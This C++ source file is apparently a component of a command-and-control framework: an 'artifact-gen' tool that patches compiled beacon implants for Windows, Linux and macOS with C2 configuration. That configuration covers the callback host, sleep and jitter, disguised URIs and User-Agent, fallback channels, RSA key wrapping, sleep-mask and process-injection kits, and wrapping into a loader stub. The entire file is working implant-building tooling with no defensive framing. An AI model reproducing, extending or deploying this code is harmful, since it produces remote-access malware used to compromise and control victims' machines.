// artifact-gen: patch a compiled beacon DLL or EXE with C2 config.
//
// Usage:
//   artifact-gen --input <path|auto> --key <hex64> --host <host> [options] --out <output>
//
// Options:
//   --input    <path>    шаблонный бинарник; "auto" — определить по --os/--arch/--type
//   --os       <os>      windows | linux  (default: windows)
//   --arch     <arch>    x64 | x86 | arm64 | arm32  (default: x64)
//   --type     <fmt>     exe | dll  (default: exe; только для Windows)
//   --port     <n>       (default 443)
//   --sleep    <ms>      (default 5000)
//   --jitter   <pct>     (default 15)
//   --uri-checkin <path> (default /search)
//   --uri-task  <path>   (default /api/feed)
//   --uri-post  <path>   (default /submit)
//   --ua       <string>  User-Agent
//   --cookie   <name>    session cookie name (default sid)
//   --pubkey   <hex>     listener RSA-2048 BCRYPT_RSAPUBLIC_BLOB (per-session
//                        AES key wrap). Without it beacon stays on listener_key.
//   --parent-id <id>     идентификатор родителя (для relay child beacon)
//   --fallback <host:port[:uri]>  резервный C2-канал (до 4 штук, повторяемый)
//   --stub     <path>    EXE-stub из Artifact Kit; если задан -- пропатченный
//                        бикон встраивается в .co2pay секцию stub'а, и --out
//                        получает stub.exe вместо чистого бикона.
//
// Auto-resolve (--input auto):
//   linux + x64   → beacon-linux64
//   linux + arm64 → beacon-linux-arm64
//   linux + arm32 → beacon-linux-arm32
//   macos + arm64 → beacon-macos
//   macos + arm64 + dylib → beacon-macos.dylib
//   windows + x64 + exe → beacon64.exe
//   windows + x86 + dll → beacon32.dll

#include "PatchBeacon.hpp"
#include "Wrappers.hpp"

#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

using namespace co2h::artgen;

static void usage(const char* prog) {
    // Справка отключена: artifact-gen вызывается клиентом из меню "Generate artifact",
    // вручную пользователь его не запускает.
    (void)prog;
    // std::fprintf(stderr,
    //     "Usage: %s --input <beacon.dll|beacon.exe> --key <hex64> --host <host>"
    //     " [--port N] [--sleep ms] [--jitter pct] --out <output>\n", prog);
}

static bool hex_to_bytes(const std::string& s, std::vector<uint8_t>& out) {
    if (s.size() % 2) return false;
    out.resize(s.size() / 2);
    for (size_t i = 0; i < s.size(); i += 2) {
        auto nibble = [](char c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            return -1;
        };
        int hi = nibble(s[i]), lo = nibble(s[i+1]);
        if (hi < 0 || lo < 0) return false;
        out[i/2] = static_cast<uint8_t>((hi << 4) | lo);
    }
    return true;
}

static std::wstring to_wide(const std::string& s) {
    return std::wstring(s.begin(), s.end());
}

static std::string get_arg(int argc, char** argv, int i) {
    if (i + 1 >= argc) {
        std::fprintf(stderr, "Missing argument for %s\n", argv[i]);
        std::exit(1);
    }
    return argv[i + 1];
}

// Авто-определение шаблонного бинарника по --os и --arch.
// Ищет бинарник в подкаталоге beacons/ рядом с artifact-gen.
static std::string resolve_input_auto(const std::string& self_path,
                                      const std::string& os,
                                      const std::string& arch,
                                      const std::string& fmt)
{
    // Каталог, в котором лежит artifact-gen → beacons/
    std::string dir;
    auto sep = self_path.find_last_of("/\\");
    if (sep != std::string::npos)
        dir = self_path.substr(0, sep + 1);
    dir += "beacons/";

    if (os == "linux") {
        std::string name;
        if (arch == "arm64")      name = "beacon-linux-arm64";
        else if (arch == "arm32") name = "beacon-linux-arm32";
        else                      name = "beacon-linux64";
        // Разделяемая библиотека (.so) — аналог DLL для Linux.
        if (fmt == "so") name += ".so";
        return dir + name;
    }
    if (os == "macos") {
        // beacon-macos — universal binary (arm64 + x64).
        // beacon-macos-arm64 / beacon-macos-x64 — single-arch.
        std::string name = "beacon-macos";
        if (arch == "arm64")       name += "-arm64";
        else if (arch == "x64")    name += "-x64";
        // arch == "universal" → без суффикса, используется fat binary.
        if (fmt == "dylib") name += ".dylib";
        return dir + name;
    }
    // Windows: beacon64.exe / beacon32.dll и т.д.
    std::string base = (arch == "x86" || arch == "32") ? "beacon32" : "beacon64";
    std::string ext  = (fmt == "dll") ? ".dll" : ".exe";
    return dir + base + ext;
}

int main(int argc, char** argv) {
    std::string input_path, key_hex, pubkey_hex, out_path, mask_path, inject_path, stub_path;
    std::string os_val = "windows", arch_val = "x64", fmt_val = "exe";
    ListenerConfig cfg;
    cfg.port        = 443;
    cfg.sleep_ms    = 5000;
    cfg.jitter_pct  = 15;
    cfg.uri_checkin = L"/search";
    cfg.uri_task    = L"/api/feed";
    cfg.uri_post    = L"/submit";
    cfg.user_agent  = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    cfg.cookie      = L"sid";

    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if      (a == "--input")        { input_path = get_arg(argc, argv, i++); }
        else if (a == "--dll")          { input_path = get_arg(argc, argv, i++); } // legacy alias
        else if (a == "--key")          { key_hex    = get_arg(argc, argv, i++); }
        else if (a == "--pubkey")       { pubkey_hex = get_arg(argc, argv, i++); }
        else if (a == "--host")         { cfg.host   = to_wide(get_arg(argc, argv, i++)); }
        else if (a == "--port")         { cfg.port   = static_cast<uint16_t>(std::stoi(get_arg(argc, argv, i++))); }
        else if (a == "--uri-checkin")  { cfg.uri_checkin = to_wide(get_arg(argc, argv, i++)); }
        else if (a == "--uri-task")     { cfg.uri_task    = to_wide(get_arg(argc, argv, i++)); }
        else if (a == "--uri-post")     { cfg.uri_post    = to_wide(get_arg(argc, argv, i++)); }
        else if (a == "--ua")           { cfg.user_agent  = to_wide(get_arg(argc, argv, i++)); }
        else if (a == "--cookie")       { cfg.cookie      = to_wide(get_arg(argc, argv, i++)); }
        else if (a == "--sleep")        { cfg.sleep_ms    = static_cast<uint32_t>(std::stoul(get_arg(argc, argv, i++))); }
        else if (a == "--jitter")       { cfg.jitter_pct  = static_cast<uint8_t>(std::stoi(get_arg(argc, argv, i++))); }
        else if (a == "--parent-id") {
            std::string pid_str = get_arg(argc, argv, i++);
            if (pid_str.size() > 32) pid_str = pid_str.substr(0, 32);
            std::memcpy(cfg.parent_id, pid_str.c_str(), pid_str.size());
        }
        else if (a == "--type")         { fmt_val  = get_arg(argc, argv, i++); }
        else if (a == "--os")           { os_val   = get_arg(argc, argv, i++); }
        else if (a == "--arch")         { arch_val = get_arg(argc, argv, i++); }
        else if (a == "--fallback") {
            // Формат: host:port или host:port:uri_checkin
            std::string fb_str = get_arg(argc, argv, i++);
            FallbackChannel fb;
            // Парсим host:port[:uri]
            auto p1 = fb_str.find(':');
            if (p1 == std::string::npos) {
                std::fprintf(stderr, "--fallback format: host:port[:uri]\n");
                return 1;
            }
            fb.host = to_wide(fb_str.substr(0, p1));
            auto p2 = fb_str.find(':', p1 + 1);
            if (p2 == std::string::npos) {
                fb.port = static_cast<uint16_t>(std::stoi(fb_str.substr(p1 + 1)));
            } else {
                fb.port = static_cast<uint16_t>(std::stoi(fb_str.substr(p1 + 1, p2 - p1 - 1)));
                fb.uri_checkin = to_wide(fb_str.substr(p2 + 1));
            }
            if (cfg.fallbacks.size() < FALLBACK_MAX_SLOTS) {
                cfg.fallbacks.push_back(fb);
            } else {
                std::fprintf(stderr, "Warning: max %zu fallback channels\n", FALLBACK_MAX_SLOTS);
            }
        }
        else if (a == "--mask")         { mask_path = get_arg(argc, argv, i++); }
        else if (a == "--inject")       { inject_path = get_arg(argc, argv, i++); }
        else if (a == "--stub")         { stub_path = get_arg(argc, argv, i++); }
        else if (a == "--out")          { out_path = get_arg(argc, argv, i++); }
        else {
            std::fprintf(stderr, "Unknown flag: %s\n", a.c_str());
            usage(argv[0]); return 1;
        }
    }

    // Если --input auto — авто-выбор шаблона по --os / --arch / --type.
    if (input_path == "auto") {
        input_path = resolve_input_auto(argv[0], os_val, arch_val, fmt_val);
        std::printf("[*] Auto-resolved input: %s\n", input_path.c_str());
    }

    if (input_path.empty() || key_hex.empty() || cfg.host.empty() || out_path.empty()) {
        usage(argv[0]); return 1;
    }

    std::vector<uint8_t> key_bytes;
    if (!hex_to_bytes(key_hex, key_bytes) || key_bytes.size() != 32) {
        std::fprintf(stderr, "Key must be 64 hex digits (32 bytes)\n");
        return 1;
    }
    std::copy(key_bytes.begin(), key_bytes.end(), cfg.listener_key.begin());

    if (!pubkey_hex.empty()) {
        if (!hex_to_bytes(pubkey_hex, cfg.rsa_pub_blob)) {
            std::fprintf(stderr, "--pubkey must be hex (BCRYPT_RSAPUBLIC_BLOB)\n");
            return 1;
        }
        if (cfg.rsa_pub_blob.size() > 540) {
            std::fprintf(stderr,
                "--pubkey blob is %zu bytes, max 540 (BEACON_RSA_PUB_MAX)\n",
                cfg.rsa_pub_blob.size());
            return 1;
        }
    }

    std::vector<uint8_t> img = read_file(input_path);
    if (img.empty()) {
        std::fprintf(stderr, "Failed to read: %s\n", input_path.c_str());
        return 1;
    }
    std::printf("[*] Loaded %s: %zu bytes\n", input_path.c_str(), img.size());

    size_t beacon_off = patch_beacon_dll(img, cfg);
    if (beacon_off == std::string::npos) {
        std::fprintf(stderr,
            "[-] BeaconState not found — compile beacon with CO2H_BEACON defined "
            "and ensure default host is L\"127.0.0.1\".\n");
        return 1;
    }
    std::string rsa_info = cfg.rsa_pub_blob.empty()
        ? std::string{"none (fallback to listener_key)"}
        : (std::to_string(cfg.rsa_pub_blob.size()) + "B");
    std::printf("[+] Patched: host=%ls port=%u key=%s rsa=%s\n",
                cfg.host.c_str(), cfg.port,
                hex(cfg.listener_key.data(), 32, 8).c_str(),
                rsa_info.c_str());
    if (!cfg.fallbacks.empty()) {
        std::printf("[+] Fallback channels: %zu\n", cfg.fallbacks.size());
        for (size_t i = 0; i < cfg.fallbacks.size(); ++i) {
            std::printf("    [%zu] %ls:%u %ls\n", i,
                        cfg.fallbacks[i].host.c_str(),
                        cfg.fallbacks[i].port,
                        cfg.fallbacks[i].uri_checkin.c_str());
        }
    }

    // Patch sleep mask if provided.
    if (!mask_path.empty()) {
        std::vector<uint8_t> mask_blob = read_file(mask_path);
        if (mask_blob.empty()) {
            std::fprintf(stderr, "Failed to read mask: %s\n", mask_path.c_str());
            return 1;
        }
        if (mask_blob.size() > SLPMSK_SLOT_SIZE) {
            std::fprintf(stderr,
                "[-] Mask too large: %zu bytes (max %zu)\n",
                mask_blob.size(), SLPMSK_SLOT_SIZE);
            return 1;
        }
        size_t mask_off = patch_sleep_mask(img, mask_blob);
        if (mask_off == std::string::npos) {
            std::fprintf(stderr,
                "[-] Sleep mask sentinel not found — ensure beacon was compiled "
                "with .slpmsk section.\n");
            return 1;
        }
        std::printf("[+] Patched sleep mask: %zu bytes at offset 0x%zX\n",
                    mask_blob.size(), mask_off);
    }

    // Patch process inject kit if provided.
    if (!inject_path.empty()) {
        std::vector<uint8_t> inject_blob = read_file(inject_path);
        if (inject_blob.empty()) {
            std::fprintf(stderr, "Failed to read inject kit: %s\n", inject_path.c_str());
            return 1;
        }
        if (inject_blob.size() > INJKIT_SLOT_SIZE) {
            std::fprintf(stderr,
                "[-] Inject kit too large: %zu bytes (max %zu)\n",
                inject_blob.size(), INJKIT_SLOT_SIZE);
            return 1;
        }
        size_t inject_off = patch_inject_kit(img, inject_blob);
        if (inject_off == std::string::npos) {
            std::fprintf(stderr,
                "[-] Inject kit sentinel not found — ensure beacon was compiled "
                "with .injkit section.\n");
            return 1;
        }
        std::printf("[+] Patched inject kit: %zu bytes at offset 0x%zX\n",
                    inject_blob.size(), inject_off);
    }

    // Wrap into Artifact-Kit EXE stub if --stub provided.
    // Без флага --stub - всё как раньше: пишем пропатченный бикон напрямую.
    if (!stub_path.empty()) {
        // Stub использует LoadLibraryW для payload - внутри должна быть DLL.
        // Командная строка позволяет --type exe + --stub, но это бессмысленно
        // (stub не запустит beacon.exe), поэтому считаем ошибкой.
        if (fmt_val == "exe") {
            std::fprintf(stderr,
                "[-] --stub requires --type dll (stub uses LoadLibraryW; an EXE "
                "payload would not start). Aborting.\n");
            return 1;
        }
        std::vector<uint8_t> stub = read_file(stub_path);
        if (stub.empty()) {
            std::fprintf(stderr, "Failed to read stub: %s\n", stub_path.c_str());
            return 1;
        }
        size_t magic_off = wrap_in_stub(stub, img);
        if (magic_off == std::string::npos) {
            std::fprintf(stderr,
                "[-] Stub wrap failed - .co2pay section/magic not found or "
                "payload too large (%zu bytes, max %zu).\n",
                img.size(), ARTIFACT_MAX_PAYLOAD);
            return 1;
        }
        std::printf("[+] Wrapped beacon into stub: payload=%zu bytes at offset 0x%zX\n",
                    img.size(), magic_off);
        if (!write_file(out_path, stub)) {
            std::fprintf(stderr, "Failed to write: %s\n", out_path.c_str());
            return 1;
        }
        std::printf("[+] Wrote: %s (%zu bytes, stub-wrapped)\n",
                    out_path.c_str(), stub.size());
        return 0;
    }

    if (!write_file(out_path, img)) {
        std::fprintf(stderr, "Failed to write: %s\n", out_path.c_str());
        return 1;
    }
    std::printf("[+] Wrote: %s (%zu bytes)\n", out_path.c_str(), img.size());
    return 0;
}
